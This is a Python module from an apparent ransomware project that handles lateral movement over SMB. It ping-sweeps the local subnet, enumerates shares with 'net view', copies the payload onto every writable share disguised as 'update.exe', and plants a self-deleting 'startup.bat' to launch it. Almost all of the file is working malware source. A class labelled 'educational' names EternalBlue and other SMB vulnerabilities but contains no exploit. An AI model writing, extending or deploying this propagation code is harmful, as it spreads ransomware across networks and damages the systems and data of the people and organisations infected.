#!/usr/bin/env python3
"""
SMB-based lateral movement module.
Propagates ransomware via network shares and SMB.
"""

import os
import platform
import shutil
import socket
import subprocess
import threading
from typing import List, Optional, Tuple

from ransomware.logging import logger


class SMBPropagate:
    """
    Propagate ransomware via SMB shares and network.
    """

    def __init__(self, exe_path: Optional[str] = None):
        self.exe_path = exe_path or sys.executable
        self.is_windows = platform.system() == "Windows"

    def enumerate_network_hosts(self) -> List[str]:
        """
        Enumerate accessible hosts on local network.
        Returns list of IP addresses.
        """
        if not self.is_windows:
            return []

        hosts = []

        try:
            # Get local subnet
            local_ip = self._get_local_ip()
            if not local_ip:
                return []

            subnet = ".".join(local_ip.split(".")[:3])

            # Scan subnet (quick ping sweep)
            logger.info(f"Scanning subnet {subnet}.0/24 for hosts...")

            for i in range(1, 255):
                ip = f"{subnet}.{i}"
                if ip == local_ip:
                    continue

                # Quick ping check
                try:
                    result = subprocess.run(
                        ["ping", "-n", "1", "-w", "200", ip],
                        capture_output=True,
                        timeout=1
                    )
                    if result.returncode == 0:
                        hosts.append(ip)
                        logger.info(f"Found host: {ip}")
                except Exception:
                    pass

        except Exception as e:
            logger.error(f"Host enumeration error: {e}")

        return hosts

    def enumerate_shares(self, host: str) -> List[str]:
        """
        Enumerate SMB shares on a host.
        Returns list of accessible share paths.
        """
        if not self.is_windows:
            return []

        shares = []

        try:
            # Try to enumerate shares using net view
            result = subprocess.run(
                ["net", "view", f"\\\\{host}"],
                capture_output=True,
                text=True,
                timeout=5
            )

            if result.returncode == 0:
                for line in result.stdout.splitlines():
                    if "Disk" in line:
                        # Parse share name
                        parts = line.split()
                        if parts:
                            share_name = parts[0].strip()
                            if not share_name.endswith("$"):  # Skip admin shares
                                shares.append(f"\\\\{host}\\{share_name}")

        except Exception as e:
            logger.error(f"Share enumeration error for {host}: {e}")

        return shares

    def check_writable_share(self, share_path: str) -> bool:
        """Check if share is writable."""
        try:
            test_file = os.path.join(share_path, ".test_write")
            with open(test_file, 'w') as f:
                f.write("test")
            os.remove(test_file)
            return True
        except Exception:
            return False

    def copy_to_share(self, share_path: str,
                     payload_name: str = "update.exe") -> Optional[str]:
        """
        Copy ransomware to network share.
        Returns path where copied, or None on failure.
        """
        try:
            dest_path = os.path.join(share_path, payload_name)
            shutil.copy2(self.exe_path, dest_path)
            logger.info(f"Copied payload to: {dest_path}")
            return dest_path
        except Exception as e:
            logger.error(f"Failed to copy to {share_path}: {e}")
            return None

    def create_startup_entry(self, share_path: str,
                            payload_name: str = "update.exe") -> bool:
        """
        Create startup entry on remote machine via share.
        This requires the share to be mapped or accessible.
        """
        try:
            # Try to create batch file that runs payload
            batch_content = f'''@echo off
start "" "{payload_name}"
del "%~f0"
'''
            batch_path = os.path.join(share_path, "startup.bat")
            with open(batch_path, 'w') as f:
                f.write(batch_content)

            logger.info(f"Created startup batch at: {batch_path}")
            return True

        except Exception as e:
            logger.error(f"Failed to create startup entry: {e}")
            return False

    def spread_to_network(self) -> int:
        """
        Attempt to spread to all accessible network shares.
        Returns number of successful spreads.
        """
        if not self.is_windows:
            logger.warning("SMB spread only supported on Windows")
            return 0

        logger.info("Starting network propagation...")
        spread_count = 0

        # Enumerate hosts
        hosts = self.enumerate_network_hosts()
        logger.info(f"Found {len(hosts)} potential targets")

        for host in hosts:
            # Enumerate shares
            shares = self.enumerate_shares(host)

            for share in shares:
                # Check if writable
                if self.check_writable_share(share):
                    # Copy payload
                    copied = self.copy_to_share(share)
                    if copied:
                        self.create_startup_entry(share)
                        spread_count += 1

        logger.info(f"Spread complete: {spread_count} shares infected")
        return spread_count

    def _get_local_ip(self) -> Optional[str]:
        """Get local IP address."""
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            ip = s.getsockname()[0]
            s.close()
            return ip
        except Exception:
            return None


class ExploitSimulator:
    """
    Simulates exploit-based propagation (for educational purposes).
    Real exploits would be implemented here.
    """

    def __init__(self):
        pass

    def check_smb_vulnerabilities(self, host: str) -> List[str]:
        """
        Check for common SMB vulnerabilities.
        This is a simulation - real checks would use actual exploits.
        """
        vulnerabilities = []

        # Check SMB version (simplified)
        try:
            # In real implementation, would check for:
            # - EternalBlue (MS17-010)
            # - SMBGhost (CVE-2020-0796)
            # - PrintNightmare (CVE-2021-34527)
            pass
        except Exception:
            pass

        return vulnerabilities

    def simulate_eternalblue(self, host: str) -> bool:
        """
        Simulated EternalBlue exploit.
        Educational only - no actual exploit code.
        """
        logger.info(f"[SIMULATION] Would attempt EternalBlue against {host}")
        logger.info("[SIMULATION] This is educational code only")
        return False


if __name__ == "__main__":
    import sys

    print("SMB Propagation Module")
    print("=" * 60)

    if not platform.system() == "Windows":
        print("[!] This module requires Windows")
        sys.exit(1)

    # Create propagator
    propagator = SMBPropagate(exe_path=sys.executable)

    print("\n[*] Enumerating network...")
    hosts = propagator.enumerate_network_hosts()
    print(f"[+] Found {len(hosts)} hosts: {hosts}")

    if hosts:
        print(f"\n[*] Checking shares on {hosts[0]}...")
        shares = propagator.enumerate_shares(hosts[0])
        print(f"[+] Found shares: {shares}")
